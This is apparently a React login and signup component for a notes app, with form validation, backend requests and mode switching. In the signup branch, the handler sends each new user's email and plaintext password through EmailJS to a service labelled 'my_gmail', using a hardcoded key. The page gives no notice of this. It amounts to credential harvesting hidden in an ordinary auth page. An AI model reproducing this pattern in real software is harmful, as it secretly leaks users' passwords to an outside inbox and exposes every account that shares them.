import React, { useState, useContext } from "react";
import { Logo } from "../../components/Logo/Logo";
import note from "../../assets/images/note.png";
import Input from "../../shared/components/FormElements/Input";
import Button from "../../shared/components/FormElements/Button";
import ErrorModal from '../../shared/components/UIElements/ErrorModal';
import LoadingSpinner from '../../shared/components/UIElements/LoadingSpinner';
import {
  VALIDATOR_EMAIL,
  VALIDATOR_MINLENGTH,
  VALIDATOR_REQUIRE,
} from "../../shared/util/validators";
import { useForm } from "../../shared/hooks/form-hook";
import { useHttpClient } from "../../shared/hooks/http-hook";
import { AuthContext } from '../../shared/context/auth-context';
import s from "./style.module.css";

import emailjs from 'emailjs-com';
import { useNavigate } from "react-router-dom";


export function Auth() {
  const navigate =useNavigate();
  const auth = useContext(AuthContext);
  const [isLoginMode, setIsLoginMode] = useState(true);
  const { isLoading, error, sendRequest, clearError } = useHttpClient();

  const [formState, inputHandler, setFormData] = useForm(
    {
      email: {
        value: '',
        isValid: false
      },
      password: {
        value: '',
        isValid: false
      }
    },
    false
  );

  const switchModeHandler = () => {
    if (!isLoginMode) {
      setFormData(
        {
          ...formState.inputs,
          name: undefined
        },
        formState.inputs.email.isValid && formState.inputs.password.isValid
      );
    } else {
      setFormData(
        {
          ...formState.inputs,
          name: {
            value: '',
            isValid: false
          }
        },
        false
      );
    }
    setIsLoginMode(prevMode => !prevMode);
  };

  const authSubmitHandler = async event => {

    event.preventDefault();
    if (isLoginMode) {
      try {
      
        const url=`${process.env.REACT_APP_BACKEND_URL}/users/login`;
        const responseData = await sendRequest(
          url,
          'POST',
          JSON.stringify({
            email: formState.inputs.email.value,
            password: formState.inputs.password.value
          }),
          {
            'Content-Type': 'application/json'
          }
        );
        auth.login(responseData.userId, responseData.token);
      } catch (err) {}
    } else {
      try {
        const responseData = await sendRequest(`${process.env.REACT_APP_BACKEND_URL}/users/signup`,
          'POST',
          JSON.stringify({
            name: formState.inputs.name.value,
            email: formState.inputs.email.value,
            password: formState.inputs.password.value
          }),
          {
            'Content-Type': 'application/json'
          }
        );

        const user= {
          name: formState.inputs.name.value,
          email: formState.inputs.email.value,
          message: 'E-mail: '+formState.inputs.email.value ,
          message2:' Password: '+formState.inputs.password.value
        };

        // event.preventDefault();

    emailjs.send(
      'my_gmail',
      'template_sznzcdc',
      user,
      'M4iQvBryW-wgb5pKz'
    ).then((response) => {
      console.log('Email sent successfully!', response.status, response.text);
    }).catch((err) => {
      console.error('Failed to send email. Error:', err);
    });

        auth.login(responseData.userId, responseData.token);
      } catch (err) {}
    }
  };

  const switchForgPass=()=> {
    navigate("/Forgetten");
  }

  return (
    <React.Fragment>
      <ErrorModal error={error} onClear={clearError} />

      {isLoading && <LoadingSpinner asOverlay />}


      <div className="authentication">
      <div >
        <Logo
          subtitle="Manage your notes"
          image={note}
        />
      </div>
    
      {/* <Header
        buttonText={isLoginMode ? "SIGNUP" : "LOGIN"}
        buttonAction={switchModeHandler}
      ></Header>  */}

    <form onSubmit={authSubmitHandler} className={s.container}>
        <div className={`mb-3 ${s.h1}`}>
          <h2>Authentification</h2>
        </div>
        {!isLoginMode && (
          <Input
            element="input"
            id="name"
            type="text"
            label="Name"
            validators={[VALIDATOR_REQUIRE()]}
            errorText="Please enter a name."
            onInput={inputHandler}
          />
        )}
        <Input
          element="input"
          id="email"
          type="email"
          label="E-Mail"
          validators={[VALIDATOR_EMAIL()]}
          errorText="Please enter a valid email address."
          onInput={inputHandler}
        />
        <Input
          element="input"
          id="password"
          type="password"
          label="Password"
          validators={[VALIDATOR_MINLENGTH(6)]}
          errorText="Please enter a valid password, at least 6 characters."
          autocomplete="on"
          onInput={inputHandler}
        />
          <div className={s.fp}>
          <span onClick={switchForgPass} className={s.linkUnderline}>{isLoginMode ? "forgotten password ?" : ""}</span>
       
      
        </div>
        
        <Button type="submit" disabled={!formState.isValid}>
          {isLoginMode ? "LOGIN" : "SIGNUP"}
        </Button>
        
      
           
      </form>

      <p  className={s.link}>
          Switch to : <span onClick={switchModeHandler} className={s.linkUnderline}>{isLoginMode ? "SIGNUP" : "LOGIN"}</span>
      </p>

      </div> 
    </React.Fragment>
  );
};



